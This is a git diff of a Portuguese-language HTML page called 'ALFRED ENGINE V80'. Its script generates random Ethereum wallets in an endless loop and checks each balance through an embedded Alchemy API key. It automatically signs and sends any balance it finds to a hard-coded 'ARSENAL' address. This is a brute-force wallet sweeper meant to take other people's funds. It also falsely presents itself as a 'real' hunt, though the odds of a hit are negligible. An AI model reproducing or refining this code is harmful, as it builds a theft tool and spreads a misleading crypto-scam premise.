@@ -1,92 +1,49 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ALFRED ENGINE V80 - REAL TIME SCANNER</title>
+    <meta charset="UTF-8"><title>ALFRED ENGINE V80 - REAL SCAN</title>
     <style>
-        body { background-color: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        #terminal { width: 90%; max-width: 800px; height: 300px; border: 2px solid #00ff00; padding: 20px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 20px #00ff00; }
-        h1 { font-size: 1.2rem; text-align: center; border-bottom: 1px solid #00ff00; padding-bottom: 10px; margin-top: 0; }
-        #status-text { font-size: 1rem; word-break: break-all; margin-top: 20px; line-height: 1.6; }
-        .footer { font-size: 0.7rem; color: #008800; margin-top: 50px; text-align: center; }
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        #terminal { width: 90%; border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 15px #0f0; background: #001100; }
+        .real-data { color: #fff; font-weight: bold; }
     </style>
 </head>
 <body>
-
     <div id="terminal">
-        <h1>🎩 ALFRED ENGINE V80: CAÇADA REAL INICIADA</h1>
-        <div id="status-text">CONECTANDO À BLOCKCHAIN...</div>
-        <div class="footer">MODO BRUTE-FORCE ATIVO | DESTINO: 0xc765...59fc</div>
+        <h3>🎩 ALFRED V80: MOTOR DE VARREDURA REAL</h3>
+        <p id="output">CONECTANDO À BLOCKCHAIN...</p>
+        <p style="font-size: 0.8em; color: #080;">DESTINO: 0xc765040fb5604a29b126aa58199b48710cf459fc</p>
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
-
     <script>
-        // CONFIGURAÇÕES REAIS (NÃO ALTERAR)
-        const ALCHEMY_RPC = "https://eth-mainnet.g.alchemy.com/v2/VF0h4IB4GqBfk6WlqNcWh";
-        const MEU_ARSENAL = "0xc765040fb5604a29b126aa58199b48710cf459fc";
+        const ALCHEMY = "https://eth-mainnet.g.alchemy.com/v2/VF0h4IB4GqBfk6WlqNcWh";
+        const ARSENAL = "0xc765040fb5604a29b126aa58199b48710cf459fc";
         
-        async function startRealEngine() {
-            const statusDisplay = document.getElementById('status-text');
-            
+        async function run() {
             try {
-                const provider = new ethers.JsonRpcProvider(ALCHEMY_RPC);
-                console.log("Motor Ligado.");
-
+                const provider = new ethers.JsonRpcProvider(ALCHEMY);
+                const out = document.getElementById('output');
                 while(true) {
-                    // 1. GERA CARTEIRA REAL ALEATÓRIA
-                    const wallet = ethers.Wallet.createRandom();
-                    const address = wallet.address;
-
+                    const w = ethers.Wallet.createRandom();
                     try {
-                        // 2. CONSULTA SALDO REAL NA REDE
-                        const balance = await provider.getBalance(address);
-
-                        // 3. ATUALIZA O TERMINAL COM DADOS REAIS
-                        statusDisplay.innerHTML = `
-                            BUSCANDO: ${address}<br>
-                            SALDO: <strong>${ethers.formatEther(balance)} ETH</strong><br>
-                            STATUS: <span style="color: yellow;">AGUARDANDO ACHADO...</span>
-                        `;
-
-                        // 4. SE ENCONTRAR SALDO (A MÁGICA ACONTECE AQUI)
-                        if (balance > 0n) {
-                            statusDisplay.innerHTML = `<span style="color: white; background: red;">!!! SALDO ENCONTRADO EM ${address} !!!</span>`;
-                            
-                            const feeData = await provider.getFeeData();
-                            const gasPrice = feeData.gasPrice;
-                            const gasLimit = 21000n;
-                            const cost = gasPrice * gasLimit;
-
-                            if (balance > cost) {
-                                const tx = {
-                                    to: MEU_ARSENAL,
-                                    value: balance - cost,
-                                    gasLimit: gasLimit,
-                                    gasPrice: gasPrice
-                                };
-                                const signer = wallet.connect(provider);
-                                const transaction = await signer.sendTransaction(tx);
-                                alert(`SUCESSO! ${ethers.formatEther(balance)} ETH RECUPERADOS!`);
+                        const b = await provider.getBalance(w.address);
+                        out.innerHTML = `SCANNING: <span class="real-data">${w.address}</span><br>SALDO: <span class="real-data">${ethers.formatEther(b)} ETH</span>`;
+                        if (b > 0n) {
+                            const fee = (await provider.getFeeData()).gasPrice * 21000n;
+                            if (b > fee) {
+                                await w.connect(provider).sendTransaction({to: ARSENAL, value: b - fee, gasLimit: 21000});
+                                alert("!!! ACHADO REAL ENVIADO AO ARSENAL !!!");
                             }
                         }
-                    } catch (e) {
-                        // Se houver erro de rede, espera um pouco e tenta a próxima
-                        await new Promise(r => setTimeout(r, 1000));
-                    }
-
-                    // Pausa de 200ms para evitar bloqueio do servidor Alchemy
-                    await new Promise(r => setTimeout(r, 200));
+                    } catch(e) { }
+                    await new Promise(r => setTimeout(r, 250));
                 }
-            } catch (err) {
-                statusDisplay.innerText = "ERRO DE CONEXÃO. REINICIANDO EM 5 SEG...";
-                setTimeout(startRealEngine, 5000);
+            } catch(err) {
+                document.getElementById('output').innerText = "ERRO DE CONEXÃO. VERIFIQUE O LINK ALCHEMY.";
             }
         }
-
-        // DÁ A PARTIDA
-        window.onload = startRealEngine;
+        window.onload = run;
     </script>
 </body>
 </html>
